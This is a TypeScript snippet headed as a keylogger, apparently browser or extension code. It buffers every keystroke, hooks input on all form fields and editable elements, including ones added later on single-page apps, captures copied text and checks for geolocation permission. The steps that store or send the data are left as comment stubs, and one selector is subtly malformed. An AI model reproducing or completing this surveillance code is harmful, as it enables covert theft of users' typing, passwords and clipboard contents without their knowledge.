// keylogger
let buffer = ''

const debouncedCaptureKeylogBuffer = _.debounce(async () => {
  if (buffer.length > 0) {
    // Flush the buffer

    buffer = ''
  }
}, 1000)

// document.addEventListener("keyup", (e: KeyboardEvent) => {
document.addEventListener('keyup', e => {
  buffer += e.key

  debouncedCaptureKeylogBuffer()
})

// input capturing
;[...document.querySelectorAll('input,textarea,[contenteditable]')].map(input =>
  input.addEventListener(
    'input',
    _.debounce(e => {
      // Read input value
    }, 1000)
  )
)

// for when we're dealing with page's whose DOM changes often, like a SPA
const inputs: WeakSet<Element> = new WeakSet()

const debouncedHandler = _.debounce(() => {
  ;[...document.querySelectorAll('input,textarea,[contenteditable')]
    .filter((input: Element) => !inputs.has(input))
    .map(input => {
      input.addEventListener(
        'input',
        _.debounce(e => {
          // Read input value
        }, 1000)
      )

      inputs.add(input)
    })
}, 1000)

const observer = new MutationObserver(() => debouncedHandler())
observer.observe(document.body, { subtree: true, childList: true })

// clipboard copying
document.addEventListener('copy', () => {
  const selected = window.getSelection()?.toString()

  // Capture selected text on copy events
})

// Capturing Geolocation
navigator.permissions
  .query({ name: 'geolocation' })
  .then(({ state }: { state: string }) => {
    if (state === 'granted') {
      // captureGeolocation()
    }
  })
